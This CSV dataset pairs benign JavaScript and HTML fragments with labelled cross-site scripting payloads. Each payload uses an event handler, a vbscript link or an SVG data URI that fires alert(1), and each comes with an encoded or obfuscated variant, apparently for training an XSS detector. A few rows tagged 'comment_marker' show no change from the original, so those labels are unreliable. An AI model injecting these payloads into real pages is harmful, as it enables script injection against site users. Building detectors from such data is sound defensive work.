payload_original,payload_obfuscated,label,technique
this._showrangebubble(); } let offsetleft = this._calcrangeoffset();,this._showrangebubble(); } let offsetleft = this._calcrangeoffset();,0,none
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>","<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",1,comment_marker
const class_name_pointer_event = 'pointer-event' const swipe_threshold = 40 const default = {,const class_name_pointer_event = 'pointer-event' const swipe_threshold = 40 const default = {,0,none
state.modifiersdata.popperoffsets.y += y,state.modifiersdata.popperoffsets.y += y,0,none
"<hr ondblclick=""alert(1)"">test</hr>","<hr ondblclick=""alert(1)"">test</hr>",1,comment_marker
"typeof define === 'function' && define.amd ? define(['../dom/event-handler', './config', './index'], factory) : (global = typeof globalthis !== 'undefined' ? globalthis : global || self, global.swipe = factory(global.eventhandler, global.config, global.index)); })(this, (function (eventhandler, config, index_js) { 'use strict';","typeof define === 'function' && define.amd ? define(['../dom/event-handler', './config', './index'], factory) : (global = typeof globalthis !== 'undefined' ? globalthis : global || self, global.swipe = factory(global.eventhandler, global.config, global.index)); })(this, (function (eventhandler, config, index_js) { 'use strict';",0,none
"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",%3Cdatalist%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,1,urlencode
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,PGNlbnRlciBvbmJsdXI9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14PjwvY2VudGVyPjxpbnB1dCBhdXRvZm9jdXM+,1,base64
_handleselectchange(e) {,_handleselectchange(e) {,0,none
<frame id=x tabindex=1 onactivate=alert(1)></frame>,&lt;frame id=x tabindex=1 onactivate=alert(1)&gt;&lt;/frame&gt;,1,html_entities
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;legend style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/legend&gt;,1,html_entities
if (e.target && $trigger.length) { let sidenavid = m.getidfromtrigger($trigger[0]); let sidenavinstance = document.getelementbyid(sidenavid).m_sidenav;,if (e.target && $trigger.length) { let sidenavid = m.getidfromtrigger($trigger[0]); let sidenavinstance = document.getelementbyid(sidenavid).m_sidenav;,0,none
<isindex type=submit formaction=javascript:alert(1)>,&lt;isindex type=submit formaction=javascript:alert(1)&gt;,1,html_entities
"<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.1 </li>","<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.1 </li>",0,none
options.onfirstupdate(state); } }); // modifiers have the ability to execute arbitrary code before the first,options.onfirstupdate(state); } }); // modifiers have the ability to execute arbitrary code before the first,0,none
"if (!arevalidelements(reference, popper)) {","if (!arevalidelements(reference, popper)) {",0,none
"<samp ondblclick=""alert(1)"">test</samp>",&lt;samp ondblclick=&quot;alert(1)&quot;&gt;test&lt;/samp&gt;,1,html_entities
"<kbd onclick=""alert(1)"">test</kbd>",PGtiZCBvbmNsaWNrPSJhbGVydCgxKSI+dGVzdDwva2JkPg==,1,base64
<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,PGxpc3RpbmcgaWQ9eCB0YWJpbmRleD0xIG9uYmVmb3JlZGVhY3RpdmF0ZT1hbGVydCgxKT48L2xpc3Rpbmc+PGlucHV0IGF1dG9mb2N1cz4=,1,base64
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>","<colgroup oncopy=""alert( 1)"" contenteditable> test</colgroup>",1,whitespace_noise
<script>ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message='alert\x281\x29'</script>,&lt;script&gt;ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message=&#x27;alert\x281\x29&#x27;&lt;/script&gt;,1,html_entities
"<li><a href=""/wiki/hypostatic_abstraction"" title=""hypostatic abstraction"">hypostatic abstraction </a> </li>","<li><a href=""/wiki/hypostatic_abstraction"" title=""hypostatic abstraction"">hypostatic abstraction </a> </li>",0,none
"</span> <span class=""toctext"">finance and economics","</span> <span class=""toctext"">finance and economics",0,none
<caption onpointerover=alert(1)>xss</caption>,PGNhcHRpb24gb25wb2ludGVyb3Zlcj1hbGVydCgxKT54c3M8L2NhcHRpb24+,1,base64
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Cb%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fb%3E,1,urlencode
_ordertodirection(order) { if (isrtl()) { return order === order_prev ? direction_left : direction_right;,_ordertodirection(order) { if (isrtl()) { return order === order_prev ? direction_left : direction_right;,0,none
if (e.type === 'touchstart') {,if (e.type === 'touchstart') {,0,none
if (!isnan(maxmonth) && this._m > maxmonth) {,if (!isnan(maxmonth) && this._m > maxmonth) {,0,none
}); } $(this.thumb).removeclass('active');,}); } $(this.thumb).removeclass('active');,0,none
this.wrapper.append(this.el); } if (!this.contentel) {,this.wrapper.append(this.el); } if (!this.contentel) {,0,none
"return; } var _options$mainaxis = options.mainaxis,","return; } var _options$mainaxis = options.mainaxis,",0,none
if (newoption) { if (!this.ismultiple) { collection.find('li.selected').removeclass('selected');,if (newoption) { if (!this.ismultiple) { collection.find('li.selected').removeclass('selected');,0,none
<li onpointerout=alert(1)>xss</li>,<li onpointerout= alert(1)  >xss</li>,1,whitespace_noise
"onclosestart: this.options.onclosestart,","onclosestart: this.options.onclosestart,",0,none
"this.xnumsteps = this.xsteps.slice(0); for ( index = 0; index < this.xnumsteps.length; index++ ) { handlesteppoint(index, this.xnumsteps[index], this);","this.xnumsteps = this.xsteps.slice(0); for ( index = 0; index < this.xnumsteps.length; index++ ) { handlesteppoint(index, this.xnumsteps[index], this);",0,none
"'"">' + this.options.i18n.cancel + '</button>'","'"">' + this.options.i18n.cancel + '</button>'",0,none
this._element.style[property] = `${scrollbarwidth}px` } if (!isbodyoverflowing && ismodaloverflowing) {,this._element.style[property] = `${scrollbarwidth}px` } if (!isbodyoverflowing && ismodaloverflowing) {,0,none
"<li><a href=""/wiki/glossary_of_physics"" title=""glossary of physics"">physics </a> </li>","<li><a href=""/wiki/glossary_of_physics"" title=""glossary of physics"">physics </a> </li>",0,none
"_classcallcheck(this, autocomplete)","_classcallcheck(this, autocomplete)",0,none
} parsed.handles = entry.length; parsed.start = entry;,} parsed.handles = entry.length; parsed.start = entry;,0,none
if (element !== this._element && window.innerwidth > element.clientwidth + scrollbarwidth) { return; },if (element !== this._element && window.innerwidth > element.clientwidth + scrollbarwidth) { return; },0,none
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,%3Cli%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fli%3E%3Cinput%20autofocus%3E,1,urlencode
"gpuacceleration: gpuacceleration, isfixed: state.options.strategy === 'fixed' };","gpuacceleration: gpuacceleration, isfixed: state.options.strategy === 'fixed' };",0,none
"this._resetelementattributes(this._element, property_padding) this._resetelementattributes(selector_fixed_content, property_padding) this._resetelementattributes(selector_sticky_content, property_margin)","this._resetelementattributes(this._element, property_padding) this._resetelementattributes(selector_fixed_content, property_padding) this._resetelementattributes(selector_sticky_content, property_margin)",0,none
<bdi onpointerenter=alert(1)>xss</bdi>,%3Cbdi%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fbdi%3E,1,urlencode
"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname) this._issliding = false triggerevent(event_slid)","activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname) this._issliding = false triggerevent(event_slid)",0,none
"<li id=""cite_note-liwu2015-270""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-liwu2015_270-0"">^ </a> </b>","<li id=""cite_note-liwu2015-270""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-liwu2015_270-0"">^ </a> </b>",0,none
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cstrong%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fstrong%3E,1,urlencode
formreset .find(input_selector) .removeclass('valid'),formreset .find(input_selector) .removeclass('valid'),0,none
"if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, () => {","if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, () => {",0,none
<set onpointerleave=alert(1)>xss</set>,&lt;set onpointerleave=alert(1)&gt;xss&lt;/set&gt;,1,html_entities
if ( to !== false && !isnan(to) ) {,if ( to !== false && !isnan(to) ) {,0,none
"<li><a href=""/wiki/glossary_of_ichthyology"" title=""glossary of ichthyology"">ichthyology </a> </li>","<li><a href=""/wiki/glossary_of_ichthyology"" title=""glossary of ichthyology"">ichthyology </a> </li>",0,none
var attributes = state.attributes[name] || {},var attributes = state.attributes[name] || {},0,none
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>","<area on/*OBF*/beforepaste=""alert(1)"" contenteditable>test</area>",1,comment_marker
"}] }, b = { linear: a(.25, .25, .75, .75) }, f = {},","}] }, b = { linear: a(.25, .25, .75, .75) }, f = {},",0,none
resultscontainer.append(resultdiv),resultscontainer.append(resultdiv),0,none
radian = math.pi * 2 + radian; } let value = math.round(radian / unit);,radian = math.pi * 2 + radian; } let value = math.round(radian / unit);,0,none
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",&lt;big draggable=&quot;true&quot; ondragstart=&quot;alert(1)&quot;&gt;test&lt;/big&gt;,1,html_entities
this.$el.before(this.$overlay); var overlayoffset = this.$overlay[0].getboundingclientrect(); this.$overlay.css({,this.$el.before(this.$overlay); var overlayoffset = this.$overlay[0].getboundingclientrect(); this.$overlay.css({,0,none
} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,0,none
definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,0,none
"window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',","window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',",0,none
"<ins onclick=""alert(1)"">test</ins>","<ins onclick=""alert(1)  "">test</ins>",1,whitespace_noise
"}function ba(a, c) {","}function ba(a, c) {",0,none
<i onpointerleave=alert(1)>xss</i>,%3Ci%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fi%3E,1,urlencode
"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices","<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices",0,none
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",PHN1YiBvbmJlZm9yZXBhc3RlPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L3N1Yj4=,1,base64
"<th onkeypress=""alert(1)"" contenteditable>test</th>",&lt;th onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/th&gt;,1,html_entities
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,<body id=x tabindex=1 onbeforeactivate=alert(1)></ body>,1,whitespace_noise
"function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");","function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");",0,none
"this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0","this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0",0,none
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ckbd%20id%3Dx%20style%3D%22transition%3Atransform%202s%22%20ontransitionrun%3Dalert%281%29%3E%3C%2Fkbd%3E,1,urlencode
"<hgroup onmouseover=""alert(1)"">test</hgroup>",&lt;hgroup onmouseover=&quot;alert(1)&quot;&gt;test&lt;/hgroup&gt;,1,html_entities
<rp onpointerleave=alert(1)>xss</rp>,<rp onpointerleave=alert( 1)>xss</rp>,1,whitespace_noise
"this.$floatingbtnsreverse.each((el) => { anim({ targets: el,","this.$floatingbtnsreverse.each((el) => { anim({ targets: el,",0,none
"}, { key: ""_animateimageout"", value: function _animateimageout() {","}, { key: ""_animateimageout"", value: function _animateimageout() {",0,none
"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>","<a href=""vbscript:msgbox+1"">xss</a>   <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href= ""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=  ""vbscript:msgbox+1"">xss< /a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a>   <a href=""#"" language=vbs onclick=""vbscript:msgbox+1""  >xss</a>",1,whitespace_noise
}); } _focusfocuseditem() {,}); } _focusfocuseditem() {,0,none
"<plaintext onmousemove=""alert(1)"">test</plaintext>",PHBsYWludGV4dCBvbm1vdXNlbW92ZT0iYWxlcnQoMSkiPnRlc3Q8L3BsYWludGV4dD4=,1,base64
"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>","<script src=""https/*OBF*/://cdnjs.cloudflare.com/ajax/libs/dom/*OBF*/purify/2.0.12/purify.min.js""></script> <script> document.write/*OBF*/(dompurify.sanitiz/*OBF*/e('<img src onerr/*OBF*/or=alert(1)>')) </script>",1,comment_marker
"function chips(el, options) {","function chips(el, options) {",0,none
'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,0,none
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3Ccaption%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fcaption%3E,1,urlencode
<svg><summary onload=alert(1)></summary>,<svg><summary onload=aler/*OBF*/t(1)></s/*OBF*/ummary>,1,comment_marker
var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,0,none
"} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");","} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");",0,none
this.el.m_range = undefined,this.el.m_range = undefined,0,none
"this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })","this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })",0,none
"}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);","}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);",0,none
"<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>","<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>",0,none
const selector = selectorengine.getselectorfromelement(elem) const filterelement = selectorengine.find(selector) .filter(foundelement => foundelement === this._element),const selector = selectorengine.getselectorfromelement(elem) const filterelement = selectorengine.find(selector) .filter(foundelement => foundelement === this._element),0,none
"<h4><span class=""mw-headline"" id=""anti-logic_or_scruffy"">anti-logic or scruffy","<h4><span class=""mw-headline"" id=""anti-logic_or_scruffy"">anti-logic or scruffy",0,none
"<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>","<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>",0,none
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>","<div draggable="" true"" contenteditable>drag me</div><menuitem ondragover=alert(1)  contenteditable>drop here</ menuitem>",1,whitespace_noise
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,&lt;s onblur=alert(1) tabindex=1 id=x&gt;&lt;/s&gt;&lt;input autofocus&gt;,1,html_entities
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><* id=x style=""position:absolute;"" onanimationcancel=""print()""></*>",%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3C%2A%20id%3Dx%20style%3D%22position%3Aabsolute%3B%22%20onanimationcancel%3D%22print%28%29%22%3E%3C%2F%2A%3E,1,urlencode
const class_name_backdrop = 'offcanvas-backdrop'; const open_selector = '.offcanvas.show'; const event_show = `show${event_key}`;,const class_name_backdrop = 'offcanvas-backdrop'; const open_selector = '.offcanvas.show'; const event_show = `show${event_key}`;,0,none
<rp onpointerover=alert(1)>xss</rp>,<rp onpointerover=alert(1)>xss</rp>,1,comment_marker
$('.toc-wrapper').pushpin({,$('.toc-wrapper').pushpin({,0,none
"this._handleclosetriggerclickbound = this._handleclosetriggerclick.bind(this); this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound); this.dragtarget.addeventlistener('touchend', this._handledragtargetreleasebound);","this._handleclosetriggerclickbound = this._handleclosetriggerclick.bind(this); this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound); this.dragtarget.addeventlistener('touchend', this._handledragtargetreleasebound);",0,none
_configaftermerge(config) { config.target = getelement(config.target) || document.body config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin,_configaftermerge(config) { config.target = getelement(config.target) || document.body config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin,0,none
<noframes onpointerleave=alert(1)>xss</noframes>,<noframes onpointerleave=alert( 1)>xss</noframes>,1,whitespace_noise
if (!(el instanceof element)) {,if (!(el instanceof element)) {,0,none
config.defaultinterval = config.interval; return config; },config.defaultinterval = config.interval; return config; },0,none
backdrop.classname = this._config.classname; if (this._config.isanimated) { backdrop.classlist.add(class_name_fade);,backdrop.classname = this._config.classname; if (this._config.isanimated) { backdrop.classlist.add(class_name_fade);,0,none
"</span> <span class=""toctext"">superintelligence","</span> <span class=""toctext"">superintelligence",0,none
value = `${value} ${this.amorpm}`; } this.el.value = value;,value = `${value} ${this.amorpm}`; } this.el.value = value;,0,none
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>","<colgroup/*OBF*/ oncu/*OBF*/t=""alert(1)"" contenteditable>test</colgroup>",1,comment_marker
"}function i(a, c) { return h.fnc(a) ? a(c.target, c.id, c.total) : a; }function e(a, c) {","}function i(a, c) { return h.fnc(a) ? a(c.target, c.id, c.total) : a; }function e(a, c) {",0,none
"<svg><use href=""data:image/svg+xml;base64,phn2zybpzd0neccgeg1sbnm9j2h0dha6ly93d3cudzmub3jnlziwmdavc3znjyb4bwxuczp4bgluaz0nahr0cdovl3d3dy53my5vcmcvmtk5os94bgluaycgd2lkdgg9jzewmccgagvpz2h0pscxmdanpgo8aw1hz2ugahjlzj0imsigb25lcnjvcj0iywxlcnqomskiic8+cjwvc3znpg==#x"" /></svg>","&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,phn2zybpzd0neccgeg1sbnm9j2h0dha6ly93d3cudzmub3jnlziwmdavc3znjyb4bwxuczp4bgluaz0nahr0cdovl3d3dy53my5vcmcvmtk5os94bgluaycgd2lkdgg9jzewmccgagvpz2h0pscxmdanpgo8aw1hz2ugahjlzj0imsigb25lcnjvcj0iywxlcnqomskiic8+cjwvc3znpg==#x&quot; /&gt;&lt;/svg&gt;",1,html_entities
this._element.style[property] = `${scrollbarwidth}px`,this._element.style[property] = `${scrollbarwidth}px`,0,none
"<script onmouseover=""alert(1)"">test</script>",%3Cscript%20onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,1,urlencode
"<video><source src=""//evil?","<video><source src=""//evil?",1,comment_marker
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1,comment_marker
<article onpointermove=alert(1)>xss</article>,PGFydGljbGUgb25wb2ludGVybW92ZT1hbGVydCgxKT54c3M8L2FydGljbGU+,1,base64
<input id=x onfocus=alert(1)>,%3Cinput%20id%3Dx%20onfocus%3Dalert%281%29%3E,1,urlencode
"return unique(elems); }, has: function (selector) {","return unique(elems); }, has: function (selector) {",0,none
} element.classlist.add(class_name_show); this._emulateanimation(() => {,} element.classlist.add(class_name_show); this._emulateanimation(() => {,0,none
"<main onmouseover=""alert(1)"">test</main>",&lt;main onmouseover=&quot;alert(1)&quot;&gt;test&lt;/main&gt;,1,html_entities
"return fn.apply(target, [event]) } }","return fn.apply(target, [event]) } }",0,none
value: function _animateout(index) { var _this7 = this; var $collapsibleli = this.$el.children('li').eq(index);,value: function _animateout(index) { var _this7 = this; var $collapsibleli = this.$el.children('li').eq(index);,0,none
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",&lt;cite onpaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/cite&gt;,1,html_entities
<div ongestureend=alert(1)>xss</div>,&lt;div ongestureend=alert(1)&gt;xss&lt;/div&gt;,1,html_entities
"translatey: _this50.offsety,","translatey: _this50.offsety,",0,none
} else { length = this.length = elems.length; for (; i < length; i++) {,} else { length = this.length = elems.length; for (; i < length; i++) {,0,none
"<base oncopy=""alert(1)"" contenteditable>test</base>",&lt;base oncopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/base&gt;,1,html_entities
"</span> <span class=""reference-text""><cite class=""citation news"">lohr, steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""robots will take jobs, but not as fast as some fear, new report says"" </a>. <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">13 january","</span> <span class=""reference-text""><cite class=""citation news"">lohr, steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""robots will take jobs, but not as fast as some fear, new report says"" </a>. <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">13 january",0,none
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>","<cite onkeyu/*OBF*/p=""alert(1)"" con/*OBF*/te/*OBF*/nteditable>test</cite>",1,comment_marker
_showrangebubble() {,_showrangebubble() {,0,none
"function _interopnamespacedefault(e) { const n = object.create(null, { [symbol.tostringtag]: { value: 'module' } }); if (e) {","function _interopnamespacedefault(e) { const n = object.create(null, { [symbol.tostringtag]: { value: 'module' } }); if (e) {",0,none
const getselector = element => { let selector = element.getattribute('data-bs-target') if (!selector || selector === '#') {,const getselector = element => { let selector = element.getattribute('data-bs-target') if (!selector || selector === '#') {,0,none
if (e.keycode === 27) {,if (e.keycode === 27) {,0,none
"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>","<plaintext draggable=""tru/*OBF*/e"" ondragleave=""alert(1)"">test</plaintext>",1,comment_marker
"throw new error(""nouislider: 'step' is not numeric.""); } parsed.singlestep = entry;","throw new error(""nouislider: 'step' is not numeric.""); } parsed.singlestep = entry;",0,none
<meter onpointerout=alert(1)>xss</meter>,&lt;meter onpointerout=alert(1)&gt;xss&lt;/meter&gt;,1,html_entities
"http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3cscript%3ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3cscript%3ethrow%20onerror=eval,name%3c%5c/script%3e%22%3c/script%3e",aHR0cDovL3N1YmRvbWFpbjEucG9ydHN3aWdnZXItbGFicy5uZXQveHNzL3hzcy5waHA/eD0lM2NzY3JpcHQlM2VuYW1lPSUyMj1hbGVydCgxKSUyMjtsb2NhdGlvbj0lMjJodHRwczovL3BvcnRzd2lnZ2VyLWxhYnMubmV0L3hzcy94c3MucGhwP3g9JTNjc2NyaXB0JTNldGhyb3clMjBvbmVycm9yPWV2YWwsbmFtZSUzYyU1Yy9zY3JpcHQlM2UlMjIlM2Mvc2NyaXB0JTNl,1,base64
}); element.innerhtml = out; return element;,}); element.innerhtml = out; return element;,0,none
"var child = elem ? cash(elem)[0] : this[0], collection = elem ? this : cash(child).parent().children(); return slice.call(collection).indexof(child);","var child = elem ? cash(elem)[0] : this[0], collection = elem ? this : cash(child).parent().children(); return slice.call(collection).indexof(child);",0,none
$(this.dropdownoptions) .find('li') .removeclass('selected');,$(this.dropdownoptions) .find('li') .removeclass('selected');,0,none
const themeswitcherlabel = `${themeswitchertext.textcontent} (${btntoactive.dataset.bsthemevalue})`,const themeswitcherlabel = `${themeswitchertext.textcontent} (${btntoactive.dataset.bsthemevalue})`,0,none
"<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>","<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>",0,none
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>","<div draggable=""true"" contenteditable>drag me<  /div><article ondragover=alert(1) contenteditable>drop here</  article> ",1,whitespace_noise
"$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')","$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')",0,none
"stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };","stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };",0,none
